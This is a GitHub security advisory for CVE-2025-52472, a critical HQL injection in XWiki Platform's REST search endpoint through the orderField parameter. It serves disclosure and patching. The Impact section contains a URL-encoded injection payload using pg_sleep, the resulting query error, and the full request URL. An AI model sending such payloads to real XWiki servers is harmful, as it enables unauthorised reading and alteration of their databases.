# [C] XWiki Platform is vulnerable to HQL injection via wiki and space search REST API

## Summary
Severity: Critical
Advisory: GHSA-gprp-h92g-gc2h
CVE: CVE-2025-52472
CWE: CWE-89
Ecosystem: Maven
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-10-06
Source: https://github.com/advisories/GHSA-gprp-h92g-gc2h
Type: github-advisory

## Affected
- Maven: `org.xwiki.platform:xwiki-platform-rest-server` — affected >=17.0.0-rc-1 <17.4.2
- Maven: `org.xwiki.platform:xwiki-platform-rest-server` — affected >=4.3-milestone-1 <16.10.9

## Details
### Impact

The REST search URL is vulnerable to HQL injection via the `orderField` parameter. The specified value is added twice in the query, though, once in the field list for the select and once in the order clause, so it's not that easy to exploit. The part of the query between the two fields can be enclosed in single quotes to effectively remove them, but the query still needs to remain valid with the query two times in it.

For example, with the following `orderField` parameter:

```
doc.fullName%20from%20XWikiDocument%20as%20doc%20where%20%24%24%3D'%24%24%3Dconcat(chr(61)%2Cchr(39))%20and%20version()%7C%7Cpg_sleep(1)%3Dversion()%7C%7Cpg_sleep(1)%20and%20(1%3D1%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F)%20--%20comment'%20or%20a%3D'%20order%20by%20doc.fullName
```
See the following error:

```
QuerySyntaxException: unexpected token: $$ near line 1, column 518 [select distinct doc.fullName, doc.space, doc.name, doc.language, doc.doc.fullName from com.xpn.xwiki.doc.XWikiDocument as doc where (doc.hidden <> true or doc.hidden is null) and ($$='$$=concat(chr(61),chr(39)) and version()||pg_sleep(1)=version()||pg_sleep(1) and (1=1 or ?=? or ?=? or ?=? or ?=? or ?=?) -- comment' or a=') order by doc.fullName from com.xpn.xwiki.doc.XWikiDocument as doc  where ( (upper(doc.title) like :keywords) ) order by doc.doc.fullName from com.xpn.xwiki.doc.XWikiDocument as doc where $$='$$=concat(chr(61),chr(39)) and version()||pg_sleep(1)=version()||pg_sleep(1) and (1=1 or ?=? or ?=? or ?=? or ?=? or ?=?) -- comment' or a=' order by doc.fullName asc]
```

For reference, the full URL for the above error is:

```
http://localhost:8080/xwiki/rest/wikis/xwiki/search?q=test&scope=title&orderField=doc.fullName%20from%20XWikiDocument%20as%20doc%20where%20%24%24%3D%27%24%24%3Dconcat(chr(61)%2Cchr(39))%20and%20version()%7C%7Cpg_sleep(1)%3Dversion()%7C%7Cpg_sleep(1)%20and%20(1%3D1%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F)%20--%20comment%27%20or%20a%3D%27%20order%20by%20doc.fullName
```

### Patches

This has been patched in 17.5.0, 17.4.2, 16.10.9.

### Workarounds

There is no known workaround, other than upgrading XWiki.

### Resources

* https://jira.xwiki.org/browse/XWIKI-23247
* https://github.com/xwiki/xwiki-platform/commit/743ebf8696ffa55161ed2c5ecf26b09f69e6bcf1
* https://github.com/xwiki/xwiki-platform/commit/a45eca2af772abb7324e56d7fd2df1ac937bc445

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [Jira XWiki.org](https://jira.xwiki.org/)
* Email us at [Security Mailing List](mailto:security@xwiki.org)

## References
- https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-gprp-h92g-gc2h
- https://nvd.nist.gov/vuln/detail/CVE-2025-52472
- https://github.com/xwiki/xwiki-platform/commit/743ebf8696ffa55161ed2c5ecf26b09f69e6bcf1
- https://github.com/xwiki/xwiki-platform/commit/a45eca2af772abb7324e56d7fd2df1ac937bc445
- https://github.com/xwiki/xwiki-platform
- https://jira.xwiki.org/browse/XWIKI-23247
